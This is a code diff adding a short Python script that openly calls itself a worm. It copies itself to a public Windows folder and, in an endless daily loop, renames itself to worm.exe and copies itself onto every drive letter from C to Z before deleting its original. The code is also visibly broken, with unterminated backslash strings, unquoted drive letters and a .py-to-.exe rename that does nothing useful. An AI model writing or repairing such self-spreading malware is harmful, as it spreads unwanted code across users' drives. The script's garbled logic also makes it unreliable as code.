@@ -1,0 +1,31 @@
+import os
+import shutil
+import subprocess
+import time
+from datetime import datetime
+
+# Define the file path where you want to copy the script to
+file_path = r"C:\Users\Public\Documents"
+
+# Create a backup of the current Python script for later use
+filename = "worm.py"
+shutil.copy(os.path.abspath(__file__), file_path + "\" + filename)
+
+# Infinite loop to keep running the worm
+while True:
+    # Rename the current Python script as a .exe and copy it to all drives on the computer
+    os.rename(os.path.abspath(__file__), "worm.exe")
+    for drive in range(ord(C), ord(Z) + 1):
+        try:
+            if chr(drive) != C:
+                new_filename = os.path.join(chr(drive) + ":", "\", filename)
+                shutil.copy("worm.exe", new_filename)
+        except Exception as e:
+            pass # Ignore errors for non-existent drives or permission issues
+    
+    # Rename the .exe back to a Python script and delete the original copy of the worm from the drive
+    os.rename("worm.exe", filename)
+    os.remove(os.path.abspath(__file__))
+    
+    # Wait for 24 hours before running again
+    time.sleep(60 * 60 * 24)
